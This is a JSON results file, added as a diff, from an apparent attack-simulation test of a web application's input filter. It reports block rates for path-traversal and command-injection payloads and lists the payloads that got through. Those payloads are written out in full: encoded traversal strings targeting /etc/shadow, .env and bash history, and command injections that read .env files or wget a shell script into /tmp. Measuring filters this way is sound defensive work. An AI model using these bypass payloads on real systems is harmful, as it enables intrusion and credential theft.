@@ -1,0 +1,456 @@
+{
+  "inputs": {
+    "corpus": {
+      "path": "attack-sim/large_corpus_requests.json",
+      "sha256": "32a171803259cfc4cde87cfb3cf4e740a4eef26d13b562d885ea8abdf7348b1a"
+    },
+    "results": {
+      "path": "attack-sim/results_config2.json",
+      "sha256": "ed3fbc91b80f68483ffef5ae9dc432dab9ce104836ddbca1a2295dd873031054"
+    }
+  },
+  "path_traversal": {
+    "n": 200,
+    "blocked": 170,
+    "pct_blocked": 85.0,
+    "wilson_95_pct": [
+      79.39,
+      89.29
+    ],
+    "errors": [],
+    "by_encoding": {
+      "null_byte": {
+        "n": 29,
+        "blocked": 29,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          88.3,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "double_encoding": {
+        "n": 23,
+        "blocked": 16,
+        "pct_blocked": 69.57,
+        "wilson_95_pct": [
+          49.13,
+          84.4
+        ],
+        "not_blocked": [
+          {
+            "id": "path_traversal_22",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/log/syslog",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_38",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_58",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_63",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/.env",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_74",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252fhome/node/.bash_history",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_111",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fproc/self/status",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_121",
+            "payload": "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fapp/src/app.js",
+            "status": 404
+          }
+        ]
+      },
+      "overlong_utf8": {
+        "n": 19,
+        "blocked": 17,
+        "pct_blocked": 89.47,
+        "wilson_95_pct": [
+          68.61,
+          97.06
+        ],
+        "not_blocked": [
+          {
+            "id": "path_traversal_31",
+            "payload": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_113",
+            "payload": "%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afinetpub/wwwroot/web.config",
+            "status": 404
+          }
+        ]
+      },
+      "dot_slash_duplication": {
+        "n": 21,
+        "blocked": 21,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          84.54,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "backslash": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "absolute": {
+        "n": 15,
+        "blocked": 15,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          79.61,
+          100.0
+        ],
+        "not_blocked": []
+      },
+      "encoded_dotdot_slash_or_mixed": {
+        "n": 43,
+        "blocked": 22,
+        "pct_blocked": 51.16,
+        "wilson_95_pct": [
+          36.75,
+          65.38
+        ],
+        "not_blocked": [
+          {
+            "id": "path_traversal_7",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fetc/crontab",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_19",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fapp/docker-compose.yml",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_27",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fwindows/system32/drivers/etc/hosts",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_34",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_43",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2Flog%2Fsyslog",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_60",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2Flog%2Fauth.log",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_78",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2Fsrc%2Fapp.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_89",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fetc/ssh/sshd_config",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_91",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fapp/src/db.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_93",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2Fnode_modules%2F.package-lock.json",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_102",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2Fsrc%2Fdb.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_109",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2Fsrc%2Fdb.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_122",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2Fdocker-compose.yml",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_126",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fetc/shadow",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_147",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fssh%2Fsshd_config",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_148",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fhosts",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_151",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2Fetc/crontab",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_152",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fapp/src/app.js",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_175",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2F%2E%2e%2Fproc/self/cmdline",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_179",
+            "payload": "%2E%2e%2F%2E%2e%2F%2E%2e%2Fwindows/system32/drivers/etc/hosts",
+            "status": 404
+          },
+          {
+            "id": "path_traversal_187",
+            "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2Fcrontab",
+            "status": 404
+          }
+        ]
+      },
+      "raw_dotdot_slash": {
+        "n": 25,
+        "blocked": 25,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          86.68,
+          100.0
+        ],
+        "not_blocked": []
+      }
+    },
+    "unclassified": []
+  },
+  "cmdi": {
+    "n": 199,
+    "blocked": 183,
+    "pct_blocked": 91.96,
+    "wilson_95_pct": [
+      87.34,
+      94.99
+    ],
+    "errors": [
+      {
+        "id": "cmdi_94",
+        "payload": "127.0.0.1&sleep 5",
+        "error": "timed out"
+      }
+    ],
+    "by_system": {
+      "windows": {
+        "n": 34,
+        "blocked": 23,
+        "pct_blocked": 67.65,
+        "wilson_95_pct": [
+          50.84,
+          80.87
+        ]
+      },
+      "posix": {
+        "n": 165,
+        "blocked": 160,
+        "pct_blocked": 96.97,
+        "wilson_95_pct": [
+          93.1,
+          98.7
+        ]
+      }
+    },
+    "by_separator": {
+      "||": {
+        "n": 12,
+        "blocked": 10,
+        "pct_blocked": 83.33,
+        "wilson_95_pct": [
+          55.2,
+          95.3
+        ]
+      },
+      "&&": {
+        "n": 32,
+        "blocked": 30,
+        "pct_blocked": 93.75,
+        "wilson_95_pct": [
+          79.85,
+          98.27
+        ]
+      },
+      "|": {
+        "n": 45,
+        "blocked": 41,
+        "pct_blocked": 91.11,
+        "wilson_95_pct": [
+          79.27,
+          96.49
+        ]
+      },
+      "&": {
+        "n": 24,
+        "blocked": 22,
+        "pct_blocked": 91.67,
+        "wilson_95_pct": [
+          74.15,
+          97.68
+        ]
+      },
+      ";": {
+        "n": 47,
+        "blocked": 43,
+        "pct_blocked": 91.49,
+        "wilson_95_pct": [
+          80.07,
+          96.64
+        ]
+      },
+      "newline (\\n / %0a)": {
+        "n": 31,
+        "blocked": 29,
+        "pct_blocked": 93.55,
+        "wilson_95_pct": [
+          79.28,
+          98.21
+        ]
+      },
+      "backticks": {
+        "n": 2,
+        "blocked": 2,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          34.24,
+          100.0
+        ]
+      },
+      "$()": {
+        "n": 6,
+        "blocked": 6,
+        "pct_blocked": 100.0,
+        "wilson_95_pct": [
+          60.97,
+          100.0
+        ]
+      },
+      "no_separator": {
+        "n": 0,
+        "blocked": 0,
+        "pct_blocked": null,
+        "wilson_95_pct": null
+      }
+    },
+    "not_blocked": [
+      {
+        "id": "cmdi_20",
+        "payload": "127.0.0.1|&cat /app/.env //",
+        "status": 200
+      },
+      {
+        "id": "cmdi_21",
+        "payload": "127.0.0.1%0atype C:\\Windows\\win.ini %23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_42",
+        "payload": "127.0.0.1|`type C:\\Windows\\win.ini`",
+        "status": 200
+      },
+      {
+        "id": "cmdi_47",
+        "payload": "127.0.0.1|type C:\\Windows\\win.ini",
+        "status": 200
+      },
+      {
+        "id": "cmdi_51",
+        "payload": "127.0.0.1%26sleep 10",
+        "status": 200
+      },
+      {
+        "id": "cmdi_53",
+        "payload": "127.0.0.1&type C:\\Windows\\win.ini #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_80",
+        "payload": "127.0.0.1;;type C:\\Windows\\win.ini #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_109",
+        "payload": "127.0.0.1%26%26type C:\\Windows\\win.ini",
+        "status": 200
+      },
+      {
+        "id": "cmdi_127",
+        "payload": "127.0.0.1%3btype C:\\Windows\\win.ini",
+        "status": 200
+      },
+      {
+        "id": "cmdi_150",
+        "payload": "127.0.0.1||type C:\\Windows\\win.ini #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_152",
+        "payload": "127.0.0.1%3bcat /app/.env",
+        "status": 200
+      },
+      {
+        "id": "cmdi_155",
+        "payload": "127.0.0.1%3B%3Bwget%20http%3A%2F%2F10.0.0.1%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_182",
+        "payload": "127.0.0.1|type C:\\Windows\\win.ini #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_187",
+        "payload": "127.0.0.1&&type C:\\Windows\\win.ini %23",
+        "status": 200
+      },
+      {
+        "id": "cmdi_193",
+        "payload": "127.0.0.1\ncat /app/.env #",
+        "status": 200
+      },
+      {
+        "id": "cmdi_197",
+        "payload": "127.0.0.1||type C:\\Windows\\win.ini %23",
+        "status": 200
+      }
+    ]
+  }
+}
